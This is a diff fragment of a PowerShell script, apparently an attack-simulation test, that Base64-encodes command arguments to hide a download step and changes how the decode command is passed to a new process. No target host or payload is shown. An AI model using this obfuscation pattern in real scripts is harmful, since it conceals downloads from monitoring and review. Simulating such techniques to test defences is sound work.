@@ -37,7 +37,7 @@ $encodedArguments = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ra
 $decodeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encodedArguments'))"
 
 # Construct the final execution command
-$arguments = "-Command $decodeCommand"
+$arguments = "$decodeCommand"
 
 # Start the process
 Write-Host "[*] Performing download with Base64-obfuscated arguments"
